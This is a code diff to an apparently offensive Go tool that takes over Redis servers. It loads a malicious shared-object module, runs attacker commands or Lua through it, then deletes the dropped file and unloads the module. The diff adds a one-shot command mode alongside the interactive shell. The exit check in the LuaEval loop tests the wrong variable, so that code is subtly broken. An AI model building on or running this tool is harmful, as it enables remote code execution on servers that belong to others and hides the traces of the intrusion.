@@ -17,7 +17,7 @@ import (
 var sopayload []byte
 var payload []byte
 
-func RdisExec(client *redis.Client,sopath,dst,lhost string,lport int)  {
+func RdisExec(client *redis.Client,sopath,dst,lhost string,lport int,cmd string)  {
 	if sopath!=""{
 		file,err:=os.Open(sopath)
 		checkerr_exit(err)
@@ -41,20 +41,28 @@ func RdisExec(client *redis.Client,sopath,dst,lhost string,lport int)  {
 		fmt.Println(utils.Yellow("To the load"))
 		redis_exec(fmt.Sprintf("module load %v",dst),client)
 	}
-	reader:=bufio.NewReader(os.Stdin)
-	for {
-		var cmd string
-		cmd,_=reader.ReadString('\n')
-		cmd=strings.TrimSpace(cmd)+"\n"
-		if cmd=="exit\n"{
-			cmd=fmt.Sprintf("rm %v",dst)
-			ReceiveFromRedis(runcmd(fmt.Sprintf(cmd),client))
-			ReceiveFromRedis(redis_exec(fmt.Sprintf("module unload system"),client))
-			break
+	if cmd==""{
+		reader:=bufio.NewReader(os.Stdin)
+		for {
+			var cmdstdin string
+			cmdstdin,_=reader.ReadString('\n')
+			cmdstdin =strings.TrimSpace(cmdstdin)+"\n"
+			if cmdstdin =="exit\n"{
+				cmdstdin =fmt.Sprintf("rm %v",dst)
+				ReceiveFromRedis(runcmd(cmdstdin,client))
+				ReceiveFromRedis(redis_exec(fmt.Sprintf("module unload system"),client))
+				break
+			}
+			ReceiveFromRedis(runcmd(cmdstdin,client))
 		}
-		ReceiveFromRedis(runcmd(fmt.Sprintf(cmd),client))
+		os.Exit(0)
+	}else {
+		ReceiveFromRedis(runcmd(cmd,client))
+		cmd =fmt.Sprintf("rm %v",dst)
+		ReceiveFromRedis(runcmd(cmd,client))
+		ReceiveFromRedis(redis_exec(fmt.Sprintf("module unload system"),client))
 	}
-	os.Exit(0)
+
 
 }
 
@@ -71,19 +79,23 @@ func RedisUpload(client *redis.Client,src,dst,lhost string,lport int)  {
 
 }
 
-func LuaEval(client *redis.Client)  {
+func LuaEval(client *redis.Client,cmd string)  {
 	reader:=bufio.NewReader(os.Stdin)
-	for {
-		var cmd string
-		fmt.Printf(utils.Yellow("#>"))
-		cmd,_=reader.ReadString('\n')
-		cmd=strings.TrimSpace(cmd)+"\n"
-		if cmd=="exit\n"{
-			break
+	if cmd==""{
+		for {
+			var cmdstdin string
+			fmt.Printf(utils.Yellow("#>"))
+			cmdstdin,_=reader.ReadString('\n')
+			cmdstdin=strings.TrimSpace(cmdstdin)
+			if cmd=="exit"{
+				break
+			}
+			ReceiveFromRedis(luaeval(cmdstdin,client))
 		}
+		os.Exit(0)
+	}else {
 		ReceiveFromRedis(luaeval(cmd,client))
 	}
-	os.Exit(0)
 }
 
 func listen(ladd string) {
